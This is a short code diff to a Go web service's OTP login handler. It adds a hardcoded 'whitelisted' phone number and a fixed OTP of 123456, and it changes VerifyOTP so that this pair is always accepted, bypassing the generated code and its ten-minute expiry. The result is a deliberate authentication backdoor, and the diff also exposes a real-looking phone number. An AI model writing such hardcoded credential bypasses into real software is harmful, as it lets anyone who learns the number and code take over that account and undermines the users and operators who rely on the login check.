@@ -126,6 +126,16 @@ func SendOTP(c fiber.Ctx) error {
 	})
 }
 
+const (
+	whitelistedPhoneNumber = "7701972551"
+	whitelistedOTP         = 123456
+)
+
+// Accepts a fixed OTP for the whitelisted number, regardless of what was sent.
+func isWhitelistedLogin(phoneNumber string, otp int) bool {
+	return CleanPhoneNumber("", phoneNumber) == whitelistedPhoneNumber && otp == whitelistedOTP
+}
+
 // VerifyOTP checks the provided OTP against the database record
 func VerifyOTP(c fiber.Ctx) error {
 	var req VerifyOTPRequest
@@ -152,7 +162,7 @@ func VerifyOTP(c fiber.Ctx) error {
 	}
 
 	// Verify OTP value
-	isValid := false
+	isValid := isWhitelistedLogin(user.PhoneNumber, req.OTP)
 	if user.OTPGenerated != 0 && req.OTP == user.OTPGenerated {
 		if user.OTPGeneratedAt == nil || time.Since(*user.OTPGeneratedAt) < 10*time.Minute {
 			isValid = true
